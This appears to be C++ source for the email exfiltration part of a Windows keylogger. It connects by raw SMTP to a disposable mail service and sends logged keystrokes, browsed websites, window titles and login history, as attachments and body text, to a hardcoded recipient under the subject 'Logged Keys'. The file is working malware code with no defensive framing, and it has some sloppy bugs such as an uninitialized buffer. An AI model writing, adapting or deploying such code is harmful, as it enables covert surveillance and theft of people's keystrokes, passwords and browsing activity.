#define _WIN32_WINNT 0x501
#include<bits/stdc++.h>
#include<windows.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <winsock2.h>

using namespace std;

#define SMTP_PORT "25"
#define DEFAULT_BUFLEN 512
#define EMAIL_TIME 7200
#define SSTIME 900
#define recipientAddr "mdsiam01@sharklasers.com"
#define SMTPLog "smtp.log"

int sendData(SOCKET* socket, const char* data)
{
    int res;
    printf("%s", data);
    res = send(*socket, data, (int)strlen(data), 0);
    if (res == SOCKET_ERROR) {
        printf("send failed (msg: %s): %d\n", data, WSAGetLastError());
    }
    return res;
}

void recvData(SOCKET* socket)
{
    int recvbuflen = DEFAULT_BUFLEN;
    char recvbuf[DEFAULT_BUFLEN];
    int res;
    res = recv(*socket, recvbuf, recvbuflen - 1, 0);
    printf("In recvData function: %d\n", res);
    if (res > 0) {
        recvbuf[res] = '\0';
        printf("%s", recvbuf);
    }
    else if (res == 0)
        printf("Connection closed\n");
    else
        printf("recv failed: %d\n", WSAGetLastError());
}


void sendTxtAttachment(SOCKET Socket, char *filename)
{
    sendData(&Socket, "--boundary\r\n");
    sendData(&Socket, "Content-Type: text/plain\r\n");
    char filenameDisposition[100];
    sprintf(filenameDisposition, "Content-Disposition: attachment; filename=%s\r\n\r\n", filename);
    sendData(&Socket, filenameDisposition);
    sendData(&Socket, "U2FtcGxlIFRleHQu");

    FILE* MailFilePtr = fopen(filename, "r");
    if (MailFilePtr == NULL)
        printf("Error opening attachment\n");

    char FileBuffer[1024];
    char buf[5020];

    memset(FileBuffer, 0, sizeof(FileBuffer));
    while (fgets(FileBuffer, sizeof(FileBuffer), MailFilePtr))
    {
        sprintf(buf, "%s", FileBuffer);
        buf[strlen(buf) - 1] = 0;
        strcat(buf,"\n");
        sendData(&Socket, buf);
        memset(FileBuffer, 0, sizeof(FileBuffer));
        memset(buf, 0, sizeof(buf));
    }

    fclose(MailFilePtr);
}

int mailMyLog(char *receiverAddress) {


    WSADATA wsaData;

    int res;
    res = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (res != 0) {
        printf("WSAStartup failed: %d\n", res);
        return 1;
    }

    struct addrinfo *result = NULL;
    struct addrinfo *ptr = NULL;
    struct addrinfo hints;

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    res = getaddrinfo("mail.sharklasers.com", SMTP_PORT, &hints, &result);
    if (res != 0) {
        printf("getaddrinfo failed: %d\n", res);
        WSACleanup();
        return 1;
    }

    SOCKET Socket = INVALID_SOCKET;
    for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {
        Socket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
        if (Socket == INVALID_SOCKET) {
            printf("socket failed: %ld\n", WSAGetLastError());
            WSACleanup();
            return 1;
        }

        res = connect(Socket, ptr->ai_addr, (int)ptr->ai_addrlen);
        if (res == SOCKET_ERROR) {
            closesocket(Socket);
            printf("error detected\n");
            Socket = INVALID_SOCKET;
            continue;
        }
        break;
    }
    freeaddrinfo(result);

    if (Socket == INVALID_SOCKET) {
        printf("Unable to connect to server!\n");
        printf(" %ld\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }

    sendData(&Socket, "HELO mail.sharklasers.com\r\n");
    recvData(&Socket);
    Sleep(1000);
    sendData(&Socket, "MAIL FROM:<keylogger@sharklasers.com>\r\n");
    recvData(&Socket);
    char line[1000];
    strcpy(line,"RCPT TO:<");
    strncat(line,receiverAddress,strlen(receiverAddress));
    strncat(line,">\r\n",3);
    sendData(&Socket, line);
    recvData(&Socket);
    sendData(&Socket, "DATA\n");
    recvData(&Socket);
    sendData(&Socket, "Subject:Logged Keys\r\n");
    sendData(&Socket, "And this is text\r\n");
    sendData(&Socket, "MIME-Version: 1.0\r\n");
    sendData(&Socket, "Content-Type:multipart/mixed;boundary=\"boundary\"\r\n");
    sendData(&Socket, "Subject:Logged Keys\r\n");
    sendData(&Socket, "\r\n"); /* added */
    sendData(&Socket, "--boundary\r\n");
    sendData(&Socket, "Content-Type: text/plain; charset=\"utf-8\"\r\n");
    sendData(&Socket, "Content-Transfer-Encoding: quoted-printable\r\n\r\n");

    char mylogs[10000];
    char tem[100];
    strcat(mylogs, "Hi Admin,=0A=0AHere are the logged keys and Prsed Data attached to the mail. And the recent login history are given below as text.=0A=0A");
    sendData(&Socket, mylogs);

    FILE *fp = fopen("login_history.txt", "r");
    while(fgets(tem,100,fp)!=NULL)
    {
        int size1= strlen(tem);
        tem[size1-1]='\n';
        tem[size1]='\0';
        sendData(&Socket, tem);
        strcat(mylogs, tem);
    }
    sendData(&Socket,"=0A=0ARegards,=0A<SIAM>=0A=0A\r\n\r\n");

    sendTxtAttachment(Socket, "windows.txt");
    sendTxtAttachment(Socket, "log.txt");
    sendTxtAttachment(Socket, "browsed_websites.txt");

    sendData(&Socket, "\r\n\r\n--boundary--\r\n\r\n");
    sendData(&Socket, ".\r\n");
    recvData(&Socket);

    sendData(&Socket, "QUIT\r\n");

    res = shutdown(Socket, SD_SEND);
    if (res == SOCKET_ERROR) {
        printf("shutdown failed: %d\n", WSAGetLastError());
        closesocket(Socket);
        WSACleanup();
        return 1;
    }

    closesocket(Socket);
    WSACleanup();
    return 0;
}
